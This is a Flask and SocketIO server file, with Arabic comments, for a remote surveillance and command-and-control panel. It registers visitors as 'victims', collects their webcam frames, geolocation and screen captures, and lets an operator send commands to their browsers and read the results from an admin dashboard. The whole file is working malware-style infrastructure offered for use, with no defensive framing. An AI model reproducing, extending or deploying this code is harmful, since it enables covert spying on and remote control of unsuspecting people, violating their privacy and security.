from flask import Flask, request, jsonify, render_template
import os
import uuid
from datetime import datetime, timedelta
from flask_socketio import SocketIO, emit

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key'  # Change this in production
socketio = SocketIO(app, cors_allowed_origins="*")  # Added CORS support

# تخزين البيانات
victims = {}
geo_data = {}
screen_frames = {}
commands = {}  # تخزين الأوامر المرسلة
command_responses = {}  # تخزين ردود الأوامر
last_seen = {}  # آخر وقت اتصال لكل ضحية

def update_last_seen(victim_id):
    last_seen[victim_id] = datetime.utcnow()

# صفحة البداية لتسجيل الضحية
@app.route("/")
def index():
    victim_id = str(uuid.uuid4())
    victims[victim_id] = {
        'registered_at': datetime.utcnow().isoformat(),
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent')
    }
    update_last_seen(victim_id)
    return render_template("index.html", victim_id=victim_id)

# صفحات الواجهة
@app.route("/camera.html")
def camera_page():
    victim_id = request.args.get("victim")
    if not victim_id:
        return "Missing victim ID", 400
    update_last_seen(victim_id)
    return render_template("camera.html", victim_id=victim_id)

@app.route("/geo.html")
def geo_page():
    victim_id = request.args.get("victim")
    if not victim_id:
        return "Missing victim ID", 400
    update_last_seen(victim_id)
    return render_template("geo.html", victim_id=victim_id)

@app.route("/screenshare.html")
def screenshare_page():
    victim_id = request.args.get("victim")
    if not victim_id:
        return "Missing victim ID", 400
    update_last_seen(victim_id)
    return render_template("screenshare.html", victim_id=victim_id)

# واجهات API لاستقبال البيانات
@app.route("/api/camera_frame", methods=["POST"])
def api_camera_frame():
    victim_id = request.args.get("victim")
    if not victim_id:
        return jsonify({"error": "Victim ID is required"}), 400

    update_last_seen(victim_id)
    frame = request.data
    
    os.makedirs("camera", exist_ok=True)
    with open(os.path.join("camera", f"{victim_id}.jpg"), "wb") as f:
        f.write(frame)

    print(f"[CAMERA] Frame saved for Victim {victim_id}")
    socketio.emit('camera_update', {'victim_id': victim_id}, namespace='/admin')
    return jsonify({"status": "ok"})

@app.route("/api/geo", methods=["POST"])
def api_geo():
    victim_id = request.args.get("victim")
    if not victim_id:
        return jsonify({"error": "Victim ID is required"}), 400

    update_last_seen(victim_id)
    data = request.get_json()
    geo_data[victim_id] = {
        'lat': data.get("lat"),
        'lon': data.get("lon"),
        'timestamp': datetime.utcnow().isoformat()
    }
    
    print(f"[GEO] Victim {victim_id} => {geo_data[victim_id]}")
    socketio.emit('geo_update', {'victim_id': victim_id, **geo_data[victim_id]}, namespace='/admin')
    return jsonify({"status": "ok"})

@app.route("/api/screen_frame", methods=["POST"])
def api_screen_frame():
    victim_id = request.args.get("victim")
    if not victim_id:
        return jsonify({"error": "Victim ID is required"}), 400

    update_last_seen(victim_id)
    frame = request.data
    
    os.makedirs("screens", exist_ok=True)
    file_path = os.path.join("screens", f"{victim_id}.jpg")
    with open(file_path, "wb") as f:
        f.write(frame)

    screen_frames[victim_id] = file_path
    print(f"[SCREEN] Frame saved for Victim {victim_id}")
    socketio.emit('screen_update', {'victim_id': victim_id}, namespace='/admin')
    return jsonify({"status": "ok"})

# نظام الأوامر المحسّن
@app.route("/api/send_command", methods=["POST"])  # Added new endpoint
def api_send_command():
    data = request.get_json()
    victim_id = data.get("victim_id")
    command = data.get("command")
    params = data.get("params", {})
    
    if not victim_id or not command:
        return jsonify({"error": "Victim ID and command are required"}), 400

    if victim_id not in victims:
        return jsonify({"error": "Victim not found"}), 404

    command_id = str(uuid.uuid4())
    cmd_data = {
        'command_id': command_id,
        'command': command,
        'params': params,
        'status': 'pending',
        'timestamp': datetime.utcnow().isoformat()
    }
    
    if victim_id not in commands:
        commands[victim_id] = []
    commands[victim_id].append(cmd_data)

    # إرسال عبر WebSocket إذا كان متصلاً
    socketio.emit('execute_command', cmd_data, room=victim_id, namespace='/victim')
    
    return jsonify({
        "status": "command_sent",
        "command_id": command_id,
        "method": "websocket" if victim_id in socketio.server.manager.rooms['/victim'] else "polling"
    })

# نظام الضحايا
@app.route("/api/victims", methods=["GET"])
def api_victims():
    result = []
    now = datetime.utcnow()

    for victim_id, data in victims.items():
        seen = last_seen.get(victim_id)
        status = "Offline"
        last_seen_str = None
        if seen:
            diff = now - seen
            if diff < timedelta(minutes=5):
                status = "Online"
            last_seen_str = seen.strftime("%Y-%m-%d %H:%M:%S UTC")

        result.append({
            "id": victim_id,
            "status": status,
            "last_seen": last_seen_str,
            "ip": data.get('ip'),
            "user_agent": data.get('user_agent')
        })

    return jsonify(result)

# WebSocket Handlers
@socketio.on('connect', namespace='/victim')
def handle_victim_connect():
    victim_id = request.args.get('victim_id')
    if not victim_id:
        return False
    
    print(f"[+] Victim connected via WebSocket: {victim_id}")
    update_last_seen(victim_id)
    
    # إرسال الأوامر المعلقة
    for cmd in commands.get(victim_id, []):
        if cmd['status'] == 'pending':
            emit('execute_command', cmd)

@socketio.on('command_response', namespace='/victim')
def handle_command_response(data):
    victim_id = data.get('victim_id')
    command_id = data.get('command_id')
    response = data.get('response')
    
    if not all([victim_id, command_id, response]):
        return
    
    # تحديث حالة الأمر
    for cmd in commands.get(victim_id, []):
        if cmd['command_id'] == command_id:
            cmd['status'] = 'completed'
            cmd['response'] = response
            cmd['completed_at'] = datetime.utcnow().isoformat()
            break
    
    if victim_id not in command_responses:
        command_responses[victim_id] = {}
    command_responses[victim_id][command_id] = response
    
    emit('command_response', data, namespace='/admin', broadcast=True)
    print(f"[+] Response received from {victim_id} for command {command_id}")

@socketio.on('connect', namespace='/admin')
def handle_admin_connect():
    print("[+] Admin dashboard connected via WebSocket")

# نظام Polling
@app.route("/api/poll_commands", methods=["GET"])
def poll_commands():
    victim_id = request.args.get("victim_id")
    if not victim_id or victim_id not in victims:
        return jsonify({"error": "Victim not found"}), 404

    update_last_seen(victim_id)

    pending = [cmd for cmd in commands.get(victim_id, []) if cmd['status'] == 'pending']
    return jsonify({"commands": pending})

@app.route("/api/command_response", methods=["POST"])
def api_command_response():
    data = request.get_json()
    victim_id = data.get("victim_id")
    command_id = data.get("command_id")
    response = data.get("response")
    
    if not all([victim_id, command_id, response]):
        return jsonify({"error": "Missing parameters"}), 400

    # نفس منطق handle_command_response
    for cmd in commands.get(victim_id, []):
        if cmd['command_id'] == command_id:
            cmd['status'] = 'completed'
            cmd['response'] = response
            cmd['completed_at'] = datetime.utcnow().isoformat()
            break
    
    if victim_id not in command_responses:
        command_responses[victim_id] = {}
    command_responses[victim_id][command_id] = response
    
    socketio.emit('command_response', data, namespace='/admin')
    return jsonify({"status": "response_received"})

# Admin endpoints
@app.route("/admin")
def admin_dashboard():
    return render_template("admin.html")

if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=5000, debug=True)
